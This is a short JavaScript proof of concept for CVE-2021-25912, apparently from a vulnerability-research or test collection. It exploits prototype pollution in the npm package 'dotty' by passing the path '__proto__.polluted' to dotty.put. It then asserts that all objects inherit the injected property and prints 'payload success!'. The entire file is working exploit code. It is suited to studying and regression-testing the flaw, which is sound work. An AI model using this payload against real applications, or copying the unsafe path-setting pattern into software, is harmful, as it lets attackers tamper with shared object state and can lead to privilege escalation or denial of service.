//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25912

const assert = require('assert');
var dotty = require("dotty")
var obj = {}
console.log("Before : " + {}.polluted);
dotty.put(obj, '__proto__.polluted', 'yes');

console.log("After : " + {}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");
